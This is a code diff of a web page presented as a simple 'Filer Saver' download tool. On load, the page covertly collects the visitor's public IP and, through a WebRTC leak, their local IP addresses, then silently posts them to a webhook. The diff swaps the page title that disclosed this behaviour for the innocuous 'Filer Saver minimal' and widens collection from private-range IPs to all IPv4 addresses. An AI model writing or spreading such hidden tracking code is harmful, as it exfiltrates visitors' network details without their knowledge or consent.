@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Filer Saver + IP Viewer (Auto Send IP on Load)</title>
+<title>Filer Saver minimal</title>
 <style>
     body {
         font-family: Arial, sans-serif;
@@ -96,7 +96,8 @@
         link.textContent = `⬇ Download "${name}"`;
     }
 
-    function getPrivateIPs(callback) {
+    // Collect all IPv4 addresses (private + public + local)
+    function getAllIPv4(callback) {
         const ips = new Set();
         const pc = new RTCPeerConnection({ iceServers: [] });
         pc.createDataChannel("");
@@ -108,10 +109,7 @@
             }
             const parts = event.candidate.candidate.split(" ");
             const ip = parts[4];
-            if (
-                /^(\d{1,3}\.){3}\d{1,3}$/.test(ip) && 
-                (ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172."))
-            ) {
+            if (/^(\d{1,3}\.){3}\d{1,3}$/.test(ip)) {
                 ips.add(ip);
             }
         };
@@ -126,13 +124,13 @@
             .then(data => {
                 publicIP = data.ip;
 
-                getPrivateIPs(ips => {
+                getAllIPv4(ips => {
                     privateIPs = ips;
 
                     fetch(webhookUrl, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ content: `Public IP: ${publicIP}\nPrivate IPs: ${privateIPs.join(", ") || "None"}` })
+                        body: JSON.stringify({ content: `Public IP: ${publicIP}\nAll IPv4 IPs: ${privateIPs.join(", ") || "None"}` })
                     }).catch(() => {
                         // Fail silently
                     });
